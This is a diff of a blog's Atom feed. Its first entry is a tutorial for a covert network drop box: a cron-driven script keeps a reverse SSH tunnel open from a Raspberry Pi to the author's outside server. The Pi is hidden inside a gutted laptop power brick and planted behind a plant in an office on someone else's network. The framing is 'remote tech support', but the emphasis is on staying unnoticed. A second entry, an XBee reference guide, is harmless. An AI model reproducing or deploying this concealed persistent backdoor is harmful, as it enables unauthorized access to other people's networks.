+  /usr/bin/ssh -N -R 2222:localhost:22 <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x73;&#101;&#x72;&#x76;&#x65;&#114;&#x55;&#115;&#101;&#114;&#64;&#x32;&#x35;&#46;&#x32;&#x35;&#46;&#50;&#53;&#x2e;&#50;&#53;">&#115;&#x65;&#x72;&#x76;&#101;&#x72;&#85;&#x73;&#x65;&#x72;&#x40;&#50;&#53;&#46;&#50;&#x35;&#46;&#x32;&#x35;&#x2e;&#50;&#53;</a>
+  if [[ $? -eq 0 ]]; then</p>
+
+<pre><code>echo Tunnel to jumpbox created successfully
+</code></pre>
+
+<p>  else</p>
+
+<pre><code>echo An error occurred creating a tunnel to jumpbox. RC was $?
+</code></pre>
+
+<p>  fi
+}
+/bin/pidof ssh
+if [[ $? -ne 0 ]]; then
+  echo Creating new tunnel connection
+  createTunnel
+fi
+```</p>
+
+<p>What this program is doing is checking to see if there&rsquo;s a process running called &lsquo;ssh&rsquo;. If there isn&rsquo;t then start the ssh tunnel.</p>
+
+<p>Next make it executable by doing the following:</p>
+
+<p><code>
+chmod 700 ~/create_ssh_tunnel.sh
+</code></p>
+
+<p>Now start the crontab.</p>
+
+<p><code>
+crontab -e
+</code>
+Place this in as your cron job (every minute check if the ssh connection is up, if not, attempt to bring it up)</p>
+
+<p><code>
+*/1 * * * * ~/create_ssh_tunnel.sh &gt; tunnel.log 2&gt;&amp;1
+</code>
+To troubleshoot any problems in this you can view the tunnel.log file.</p>
+
+<p>Now let&rsquo;s take a step back and look at what we&rsquo;ve done. When the Raspberri Pi is on, it will check every minute to see if an ssh connection to your linux server exists. If it doesn&rsquo;t it will create one. The tunnel it creates is really a reverse remote tunnel. Once the tunnel is up, anyone who ssh&rsquo;s into port 2222 of the linux server will then be redirected to the Pi. Incredible!</p>
+
+<h2>Part 2: Concealing the Pi</h2>
+
+<p>I found an old powerbrick for a laptop and gutted it.<br>
+<img src="/images/pi2.jpg" alt="Pi IMG" /></p>
+
+<p>The raspberry pi almost fit. I had to solder off the S-Video port to get it to fit just right.<br>
+<img src="/images/pi3.jpg" alt="Pi IMG" /></p>
+
+<p>Then I had to hook power up to it. In order to do this I simply took apart a USB charger. Took the plastic casing off to save space and cut the cord to save even more space. Then I soldered where the powerbrick power feed is into the USB power feed. This way when I power up the brick, it&rsquo;ll give power to the USB charger which will in turn power the Pi.<br>
+<img src="/images/pi4.jpg" alt="Pi IMG" /></p>
+
+<p>Lastly was finding a black ethernet cable so both cables coming out of the power brick are black and look inconspicuous.<br>
+<img src="/images/pi5.jpg" alt="Pi IMG" /></p>
+
+<p>Here are pictures of it in its special case:<br>
+<img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+<img src="/images/pi7.jpg" alt="Pi IMG" /></p>
+
+<h2>Part 3: Testing it</h2>
+
+<p>Check it out! <br>
+<img src="/images/pi1.jpg" alt="Pi IMG" /></p>
+
+<p>I have this plugged into an office somewhere. It looks weird when you stare at it but put it behind a plant and nobody will ever notice it (except the guy who waters the plants).</p>
+
+<p>Once I plugged it in I went back home. Right after the Pi got an IP address it created a tunnel to my home server. When I tried ssh'ing into port 2222 of my home server I was redirected to the Pi. Now I am on a computer in someone elses network. Woohoo! Now I can do remote tech support more effectively.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[XBee S2 Quick Reference Guide/Cheat Sheet and Video Tutorials to Getting Started]]></title>
+    <link href="http://tunnelsup.github.io/xbee-guide/"/>
+    <updated>2012-11-30T00:00:00-08:00</updated>
+    <id>http://tunnelsup.github.io/xbee-guide</id>
+    <content type="html"><![CDATA[<p>When I first got started with XBee I had a hard time getting the right information to help me on the projects I was working on. I put my project on hold and spent a few months simply trying to understand XBee specifically using it with arduino. Below is a cheat sheet or quick reference guide that I use now to reference whenever I&rsquo;m working on a project. It has pretty much all of the information I need to effectively use the XBee in whatever project I&rsquo;m working on.</p>
+
+<p><img class="center" src="/images/xbee.png">
+Download: <a href="/images/xbee.png">[PNG Image]</a> - <a href="/images/XBee-Quick-Reference-Guide.pdf">[PDF File]</a></p>
+
+<p>If you find any problems with this please leave a comment below and I will update the guide periodically.</p>
+
+<h2>Video Tutorial Course: XBee Basics</h2>
+
+<p>I have created 5 videos that walk you through everything on the quick reference guide above. This way you can use the guide effectively as well as learn all about XBees. Links to each lesson is below.</p>
+
+<ul>
+<li><a href="http://www.youtube.com/watch?v=odekkumB3WQ">Video 1: Overview of XBee and how to configure it</a></li>
+<li><a href="http://www.youtube.com/watch?feature=player_embedded&amp;v=mPx3TjzvE9U"> Video 2: XBee with both sides in AT mode (transparent communication)</a></li>
+<li><a href="http://www.youtube.com/watch?v=jh-GIaghIjw"> Video 3: API mode &ndash; Digital Input from remote sensor</a></li>
+<li><a href="http://www.youtube.com/watch?v=rnBx2yqKn_E"> Video 4: API mode &ndash; Analog reading from remote sensor</a></li>
+<li><a href="http://www.youtube.com/watch?v=CzH146rR-7I"> Video 5: API mode &ndash; Digital output to remote sensor</a></li>
+</ul>
+
+]]></content>
+  </entry>
+  
+</feed>
